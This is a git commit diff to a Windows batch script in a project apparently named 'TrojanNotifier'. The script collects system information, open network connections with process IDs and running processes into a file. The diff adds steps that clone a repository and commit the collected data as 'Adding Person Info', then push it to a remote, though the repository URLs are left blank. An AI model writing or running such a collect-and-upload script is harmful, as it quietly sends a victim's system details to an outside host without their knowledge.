85073bd7f977dd8b822ebae9dbbf3827ab067006
Henry Samuelson <hsamuelson@users.noreply.github.com>
2019-02-02 22:22:16 -0500

    git command uploads

--- TrojanNotifier/info.bat
+++ TrojanNotifier/info.bat
@@ -1,6 +1,14 @@
 echo "Gathering system information..."
+
+git clone ""
+cd reponame
+
 systeminfo /s LOCALHOST >> output.txt
 echo "Gathering port info..."
 netstat -a -n -o >> output.txt
 echo "Gathering running processes..."
 tasklist >> output.txt
+
+git stage *
+git commit -m "Adding Person Info"
+git push origin ""
